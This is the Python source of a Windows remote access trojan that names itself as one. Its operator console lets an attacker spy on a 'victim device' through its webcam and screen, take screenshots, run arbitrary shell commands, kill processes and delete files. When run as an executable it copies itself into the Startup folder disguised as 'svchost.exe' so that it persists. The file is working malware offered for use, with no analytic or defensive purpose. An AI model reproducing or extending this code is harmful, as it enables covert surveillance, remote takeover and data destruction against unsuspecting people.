import cmd
import os
import RatJobs
import sys
import colorama
import platform
import vidstream
import time
import threading
import socket
import shutil
import random
import struct
import uuid


__author__ = "xSquaerz"
__email__ = "eraybuyukkaya9@gmail.com"


_BANNER = """
⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄

xSquaerz windows Remote Access Trojan v1.0"""



_HELP = """
for setup server : server -i <ip> -p <port>
for close the server : destroy_server

for opening a camera : webcam_stream start
for close the camera : webcam_stream stop

for stream the screen : screenshare start
for stop stream the screen : screenshare stop

for get image from device : screenshot
for play sound a in victim device : playsound -path <file_path.mp3>

for run a cmd command and get a result : cmd -c <command>
for show a messagebox dialog : mbox -title <title> -text <text> -c <count> -i <icon>

if you want to kill a process victim device : kill_process <file.exe>
if you want to remove a file : remove_file <file.exe>
"""


_STREAM_SERVER_RUNNING = False # DON'T TOUCH THESE FLAGS ARE SO IMPORTANT FOR RUN THE CODE!!
_STREAM_SERVER_RUNNING2 = False
_SOCKET_SERVER_RUNNING = False # flag


class MainCmd(cmd.Cmd):
    prompt = "\033[4mxsquaerz\033[0m " + colorama.Fore.WHITE + "exploit(" + colorama.Fore.RED + "multi/handler" + colorama.Fore.WHITE + ") >> "
    intro = _BANNER + "\n\ntype 'help' for the help and commands\n"


    _stream_running = False
    _stream_running2 = False
    _client: socket.socket = None
    _socket_server: socket.socket = None



    def do_destroy_server(self, args):
        global _SOCKET_SERVER_RUNNING
        if len(args) == 0 and _SOCKET_SERVER_RUNNING:
            _SOCKET_SERVER_RUNNING = False
            self._stream_running = False
            self._stream_running2 = False
            self._client.sendall(str(random.choice(["quit", "exit", 'leave'])).encode('utf-8'))
            self._client.close()
            self._client = None
            self._socket_server = None
            print(colorama.Fore.YELLOW + "\n[!]", colorama.Fore.WHITE + "Server is closed.")
        else:
            print(colorama.Fore.RED + "[-]", colorama.Fore.WHITE + "\nServer is not running, u cant destroy.")



    def do_server(self, args):
        global _SOCKET_SERVER_RUNNING
        args = str(args).split()
        if len(args) != 4 or _SOCKET_SERVER_RUNNING:
            return
        
        if args[0] != "-i" or args[2] != "-p":
            return
        
        ip_addr, port = args[1].strip(), args[3]
        try:
            port = int(port)
        except ValueError:
            return
        
        self.ip, self.port = ip_addr, port

        try:
            self._socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._socket_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._socket_server.bind((ip_addr, port))
            print(colorama.Fore.BLUE + "[*]", colorama.Fore.WHITE + f"Server listening on -> {ip_addr} : {port}")
            self._socket_server.listen(1)

            self._client, _ = self._socket_server.accept()
            print(colorama.Fore.BLUE + "[*]", colorama.Fore.WHITE + "Client connected successfully ->", colorama.Fore.GREEN + "{} : {}".format(_[0], _[1]))
            _SOCKET_SERVER_RUNNING = True
        except Exception as e:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net error has been detected -> {e}")
            return

    
    def _server_stream(self, ip_addr: str, port: int) -> None:
        global _STREAM_SERVER_RUNNING

        camera_get = vidstream.StreamingServer(
            host=ip_addr, port=port + 20
        )

        try:
            camera_get.start_server()

            while _STREAM_SERVER_RUNNING == True:
                time.sleep(2)

        except Exception:
            return self._server_stream(ip_addr, port + 20)

        finally:
            camera_get.stop_server()



    def _server_stream2(self, ip_addr: str, port: int) -> None:
        global _STREAM_SERVER_RUNNING2

        screen_get = vidstream.StreamingServer(
            host=ip_addr, port=port + 30
        )

        try:
            screen_get.start_server()

            while _STREAM_SERVER_RUNNING2 == True:
                time.sleep(2)

        except Exception:
            return self._server_stream2(ip_addr, port + 30)

        finally:
            screen_get.stop_server()



    def do_clear(self, args):
        os.system("cls")

    def do_help(self, args):
        print(_HELP)

    def do_webcam_stream(self, args):
        global _STREAM_SERVER_RUNNING
        args = str(args).split()
        if len(args) > 1:
            return
        
        try:
            state = list(args)[0]
        except IndexError:
            return
        
        if not _SOCKET_SERVER_RUNNING:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net server is not running")
            return
        
        match state:
            case "start":
                if not self._stream_running:
                    _STREAM_SERVER_RUNNING = True
                    th = threading.Thread(target=self._server_stream, args=(self.ip, self.port,))
                    th.daemon = True
                    th.start()
                    self._stream_running = True
                    print(colorama.Fore.YELLOW + "\n[!]", colorama.Fore.WHITE + "webcam_stream started successfuly!")
                else:
                    print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + "webcam_stream running already")

            case "stop":
                if self._stream_running:
                    _STREAM_SERVER_RUNNING = False
                    self._stream_running = False
                    print(colorama.Fore.YELLOW + "\n[!]", colorama.Fore.WHITE + "webcam_stream stopped")
                else:
                    print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + "webcam_stream is not running")



    
    def do_screenshare(self, args):
        global _STREAM_SERVER_RUNNING2
        args = str(args).split()
        if len(args) > 1:
            return
        
        try:
            state = list(args)[0]
        except IndexError:
            return
        
        if not _SOCKET_SERVER_RUNNING:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net server is not running")
            return
        
        match state:
            case "start":
                if not self._stream_running2:
                    _STREAM_SERVER_RUNNING2 = True
                    th = threading.Thread(target=self._server_stream2, args=(self.ip, self.port,))
                    th.daemon = True
                    th.start()
                    self._stream_running2 = True
                    print(colorama.Fore.YELLOW + "\n[!]", colorama.Fore.WHITE + "screenshare stream started!")
                else:
                    print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + "screenshare showing already")

            case "stop":
                if self._stream_running2:
                    _STREAM_SERVER_RUNNING2 = False
                    self._stream_running2 = False
                    print(colorama.Fore.YELLOW + "\n[!]", colorama.Fore.WHITE + "screenshare stopped")
                else:
                    print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + "screenshare is not running")


    
    def do_mbox(self, args): # for show a messagebox dialog : mbox -title <title> -text <text> -c <count> -i <icon>
        args = str(args).split()
        if len(args) == 0 or len(args) > 8:
            return

        try:
            if not args[0] == "-title" or args[2] != "-text" or args[4] != "-c" or args[6] != "-i":
                return
            
            title, text = args[1], args[3]

            if not title or not text:
                return

            try: 
                count = int(args[5])
                icon = int(args[7])
            except ValueError:
                return
        except IndexError: 
            return

        if count > 50 or count < 0: return
        if icon > 64 or icon < 0: return
        
        if count == 0: count = 1
        
        if not _SOCKET_SERVER_RUNNING or self._client == None:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net server is not running")
            return

        text = text.replace('_', ' ')
        
        self._client.sendall(f"messagebox\n{str(count)}\n{text}\n{title}\n{str(icon)}".encode('utf-8'))

        print(colorama.Fore.YELLOW + "\n[!]", colorama.Fore.WHITE + "message sended to client!")


    def do_screenshot(self, args):
        if len(args) == 0 and _SOCKET_SERVER_RUNNING:
            self._client.sendall("screenshot".encode('utf-8'))

            size_data = b""

            while len(size_data) < 8:
                size_data += self._client.recv(8 - len(size_data))

            file_size = struct.unpack('!Q', size_data)[0]
            user_path = os.path.expanduser("~")

            if os.path.exists(os.path.join(user_path, "Desktop")):
                desktop_path = os.path.join(user_path, "Desktop")
            if os.path.exists(os.path.join(user_path, "OneDrive")):
                desktop_path = os.path.join(user_path, "OneDrive", "Desktop")
                if not os.path.exists(desktop_path):
                    os.mkdir(desktop_path)

            received = 0
            path = os.path.join(desktop_path, f"{str(uuid.uuid4())}.jpg")
            with open(path, "wb") as file:
                while received < file_size:
                    try:
                        data = self._client.recv(min(8192, file_size - received))
                    except Exception as e:
                        print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + "Failed to get screen image code: 1")
                        return
                    
                    if not data:
                        print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"Failed to get screen image code: 2")
                        return

                    file.write(data)
                    received = received + len(data)

            print(colorama.Fore.YELLOW + "[!]", colorama.Fore.WHITE + "screenshot taked -> {}".format(path))

        else:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net server is not running")

    def do_playsound(self, args):
        args = str(args).split()

        if len(args) != 2:
            return
        
        if not _SOCKET_SERVER_RUNNING:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net server is not running")
            return

        if args[0] == "-path":
            if args[1].endswith(".mp3"):
                if not os.path.exists(args[1]):
                    print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"File cannot be found")
                    return
                
                command = b"playsound"
                self._client.sendall(command)
                time.sleep(1)

                client_info = self._client.getpeername()

                print(
                    colorama.Fore.BLUE + "[*]", colorama.Fore.WHITE + 
                    f"file : {args[1]} sending to -> {client_info[0]} : {client_info[1]}"
                )

                #SEND THE PLAYSOUND FILE
                file_size = os.path.getsize(args[1])
                self._client.sendall(struct.pack('!Q', file_size))

                time.sleep(0.5)

                with open(args[1], 'rb') as file:
                    while True:
                        read = file.read(8192)
                        if not read:
                            break
                        self._client.sendall(read)

                print(colorama.Fore.GREEN + "[+]", colorama.Fore.WHITE + "file sended successfuly, waiting for result...")
                time.sleep(1)

                success_state = self._client.recv(8192).decode('utf-8').strip()

                match success_state:
                    case "COMPLETE -> PLAYING":
                        print(colorama.Fore.GREEN + "[+]", colorama.Fore.WHITE + "STATUS : SUCCESS (SOUND PLAYING..)")
                    case _:
                        print(colorama.Fore.RED + "[-]", colorama.Fore.WHITE + "STATUS : FAILED (SOUND NOT PLAYED)")
                return

            else:
                print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"Unsupported file type")
                return
            


    def do_cmd(self, args):
        args = str(args).split()
        
        if len(args) < 2: return

        if args[0] == '-c':
            del args[0]

        if not _SOCKET_SERVER_RUNNING:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net server is not running")
            return
        
        commands = "command_prompt\n"
        for command in args:
            commands = commands + command + "_"

        self._client.sendall(commands.encode('utf-8'))

        response = self._client.recv(8192)
        response = response.decode('utf-8')

        print(colorama.Fore.GREEN + "\n[+]", colorama.Fore.WHITE + f"------------------------------ CMD OUTPUT ------------------------------\n{response}")


    def do_kill_process(self, args):
        args = str(args)
        if len(args.split()) != 1 or not args.endswith(".exe"): 
            return
        
        if not _SOCKET_SERVER_RUNNING:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net server is not running")
            return
        
        command = f"command_prompt\ntaskkill_/f_/im_{args}_"

        self._client.sendall(command.encode('utf-8'))

        response = self._client.recv(8192).decode('utf-8')

        print(colorama.Fore.GREEN + "\n[+]", colorama.Fore.WHITE + f"------------------------------ TASKKILL INFO ------------------------------\n{response}")


    def do_remove_file(self, args):
        args = str(args)
        if len(args.split()) != 1:  return
        
        if not _SOCKET_SERVER_RUNNING:
            print(colorama.Fore.RED + "\n[-]", colorama.Fore.WHITE + f"socket.net server is not running")
            return
        
        command = f"command_prompt\nremovefile_{args}_"

        self._client.sendall(command.encode('utf-8'))

        response = self._client.recv(8192).decode('utf-8')

        if response.find("success") > -1:
            print(colorama.Fore.GREEN + "\n[+]", colorama.Fore.WHITE + f"\n{response}")
        else:
            print(colorama.Fore.GREEN + "\n[-]", colorama.Fore.WHITE + f"\n{response}")
        

    def do_exit(self, args):
        return True
    def do_EXIT(self, args):
        return True


if __name__ == '__main__':
    if platform.system().lower() != "windows":
        sys.exit(1)

    if not int(platform.win32_ver()[0]) >= 10:
        sys.exit(1)

    os.system("cls")
    colorama.init(True)
    
    executable = RatJobs.RATjobs.get_path_executable()
    if executable.endswith('.py'):
        try: 
            MainCmd().cmdloop()
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        startup_menu = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

        if os.path.exists(startup_menu):
            full_path = os.path.join(startup_menu, "svchost.exe")
            if not os.path.exists(full_path):
                shutil.copy(executable, full_path)

        RatJobs.Rat_Continue()


    sys.exit(0)